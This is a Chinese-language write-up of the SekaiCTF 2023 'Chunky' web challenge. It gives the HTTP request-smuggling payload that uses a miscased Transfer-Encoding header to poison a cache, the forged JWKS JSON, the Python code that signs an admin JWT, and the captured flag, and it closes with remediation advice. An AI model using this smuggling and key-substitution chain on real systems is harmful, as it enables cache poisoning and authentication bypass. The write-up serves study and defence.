# Chunky

## 题目简述

服务由三层组成：自制 Go 缓存代理、Nginx 和 Flask 博客。管理员接口只接受 RS256 JWT，并根据当前登录用户的 UUID 请求：

```text
/<user_id>/.well-known/jwks.json
```

获得验签公钥。目标是利用自制代理与 Nginx 对 HTTP 消息边界的解析差异，把攻击者博客文章的响应缓存到上述 JWKS 路径，再用自己的私钥签发管理员 token。

## 解题过程

先注册并登录普通用户，生成一对 RSA 密钥。博客的 `post.html` 直接输出标题：

```jinja2
{{ post[0] | safe }}{{ post[1] }}
```

因此把如下 JWKS JSON 作为标题、空字符串作为正文，访问文章时响应体就是合法 JSON：

```json
{
  "keys": [
    {
      "alg": "RS256",
      "x5c": ["ATTACKER_PUBLIC_KEY_BASE64"]
    }
  ]
}
```

记新用户和文章 UUID 分别为 `USER_ID`、`POST_ID`。

缓存代理逐字读取请求头，并用区分大小写的键删除：

```go
headersToRemove := [5]string{
    "Transfer-Encoding",
    "Expect",
    "Forwarded",
}
```

如果发送 `Transfer-EncodinG`，它不会被删除；Nginx 按 HTTP 规则大小写不敏感，仍会识别为 `Transfer-Encoding: chunked`。同时，自制代理只按 `Content-Length` 读取请求体。由此形成 TE.CL 解析差异：

- 缓存代理按 `Content-Length` 认为整个 `poison` 块都是第一个请求体。
- Nginx 看到分块终止符 `0\r\n\r\n` 后，认为后续字节是第二个请求。

官方利用流的结构可概括为：

```http
GET /random HTTP/1.1
Host: TARGET
Transfer-EncodinG: chunked
Content-Length: N

0

GET /post/USER_ID/POST_ID HTTP/1.1
Rik: XGET /USER_ID/.well-known/jwks.json HTTP/1.1
Host: TARGET
```

这里 `N` 只覆盖从 `0` 到 `Rik: X` 的字节。对缓存代理而言，`GET /USER_ID/.well-known/jwks.json` 留在输入流中，是下一个正常请求；对 Nginx 而言，`GET /post/...` 已是走私请求。

代理与 Nginx 复用同一后端连接。代理随后处理“JWKS 请求”并等待响应时，后端连接中排在最前面的却是走私的 `/post/...` 响应，于是代理把攻击者文章内容存入：

```text
GET /USER_ID/.well-known/jwks.json
```

这一缓存键。缓存每 60 秒清空，所以后续步骤要立即完成。可先请求 JWKS 路径，确认响应已经等于攻击者生成的 JSON。

最后用对应私钥签发：

```python
token = jwt.encode(
    {"user": "admin"},
    attacker_private_key,
    algorithm="RS256",
)

response = session.get(
    target + "/admin/flag",
    headers={"Authorization": f"Bearer {token}"},
)
```

`admin.py` 从被污染的 JWKS 响应中取出攻击者公钥，签名验证自然通过；`user` 声明又等于 `admin`，因此返回 flag。[参赛者对该链的复现记录](https://lebr0nli.github.io/blog/security/sekaiCTF-2023/#chunky-web)给出的比赛结果是：

```text
SEKAI{tr4nsf3r_3nc0d1ng_ftw!!}
```

## 方法总结

缓存代理、反向代理和应用服务器必须对请求行、头字段大小写以及消息长度采用一致解析；否则不仅会发生请求走私，还可能把一个路径的响应绑定到另一个缓存键。JWKS 也不应通过可被用户路径和共享缓存影响的 HTTP URL动态获取。修复时应使用成熟 HTTP 实现、拒绝同时出现 `Content-Length` 与 `Transfer-Encoding` 的歧义请求，并把验签密钥固定在可信配置或带完整性保护的密钥源中。
